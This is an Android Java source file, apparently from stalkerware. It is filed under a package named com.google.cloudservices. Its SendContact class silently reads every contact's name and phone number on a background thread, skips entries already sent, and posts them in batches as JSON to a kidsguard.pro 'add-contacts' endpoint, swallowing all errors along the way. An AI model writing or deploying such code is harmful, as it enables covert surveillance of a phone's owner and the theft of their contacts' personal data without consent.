package com.google.cloudservices;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;

public class SendContact {
    JSONObject contactjson=null;
    JSONArray contactarray=null;
    ArrayList<String> number1=null;
    ArrayList<String> name1=null;
    int activit=0;
    Cursor phone=null;
    pro.tasking.dbFirsRun dbFirsRun=null;
    String name=null,number=null;
    ContactDataBaseManager con=null;
    pro.tasking.checkErrorResponse checkErrorResponse=null;
    int total=0,daste=0,baghee=0,bi=0,ie=0,sad=0, c=0;
    String conta=null;
    pro.tasking.sm sm=null;
    public void sendcontac(Context context){
        new Thread(new Runnable() {
            @Override
            public void run() {

                try {


        dbFirsRun=new dbFirsRun(context);
        if (dbFirsRun.getrun().get(1).equals("contactfirst")){
            activit=1;
            dbFirsRun.Updatecall("contactsec","2");
        }else {activit=2;}
        phone=context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);
        try {number1=new ArrayList<String>();
            name1=new ArrayList<String>();
            contactarray=new JSONArray();
            while (phone.moveToNext()){

                name=phone.getString(phone.getColumnIndex(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                number= phone.getString(phone.getColumnIndex(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                con=new ContactDataBaseManager(context);
                checkErrorResponse=new checkErrorResponse();

                if (checkErrorResponse.checkeror(context,"contacts")){
                    con.Insertcontact("",number);
                    con.close();

                    name1.add(name);
                    number1.add(number);
                }else {
                    if (activit==1){

                        con.Insertcontact("",number);
                        con.close();
                        name1.add(name);
                        number1.add(number);
                    }else {if (con.getcontact().contains(number)){}else {
                        con.Insertcontact("",number);
                        con.close();
                        name1.add(name);
                        number1.add(number);

                    }}
                    }

            }
            checkErrorResponse=new checkErrorResponse();
            checkErrorResponse.deleterror(context,"contacts");
        }catch (Exception e){}finally {
            phone.close();
        }
        if (name1.size()>0){
        total=number1.size();
        daste=total/100;
        baghee=total%100;
        bi=0;
        ie=0;
        while (ie<daste){

            sad=0;
            while (sad<100){

                try {
                    contactjson=new JSONObject();
                    contactjson.put("tell", number1.get(ie*100+sad));
                    contactjson.put("name", name1.get(ie*100+sad));
                    contactarray.put( bi,contactjson);
                } catch (JSONException e) {

                }

                bi++;
                sad++;
            }
            ie++;
        }
        c=0;
        while (c<baghee){
            try {
                contactjson=new JSONObject();
                contactjson.put("tell", number1.get(daste*100+c));
                contactjson.put("name", name1.get(daste*100+c));
                contactarray.put( bi,contactjson);
            } catch (JSONException e) {

            }
            bi++;
            c++;
        }

        try {
            if (contactarray.getString(0).equals(null)){}else {
                conta= String.valueOf(contactarray);
                sm=new sm();
                sm.add(context,"https://im.kidsguard.pro/api/add-contacts/","contacts",conta);

            }
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }  }catch (NullPointerException e){}
            }
        }).start();
    }
}
